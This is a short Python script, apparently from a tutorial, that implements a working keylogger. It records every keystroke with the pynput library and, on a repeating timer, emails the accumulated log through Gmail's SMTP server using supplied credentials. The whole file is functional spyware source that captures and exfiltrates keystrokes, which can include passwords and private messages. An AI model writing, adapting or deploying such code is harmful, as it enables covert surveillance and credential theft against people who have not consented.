#!/usr/bin/env python

import pynput.keyboard # Pynput module contains mouse also which we can use to even record mouse clicks
import threading
import smtplib

class Keylogger:
    def __init__(self, time_interval, email, password): # This is the initial function which gets executed at the begining withour calling it act  same as construtor in C++
        self.log = "Keylogger Started"
        self.interval = time_interval
        self.email = email
        self.password = password
    
    def append_to_log(self, string): # The Log variable Stores the key presses and the function is called in process_key_press
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = (key.char)
            print(type(current_key))
        except AttributeError:
            if key == key.space:
                current_key = " "
            else :
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)
    
    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report) # Here we used the threading module timer to be accurate and make the line of code less.
        timer.start()    
    
    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587) # gmail mail server runs on port 587 and the host name for the server is shown
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press) # on_press variable runs for infinite time
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


  

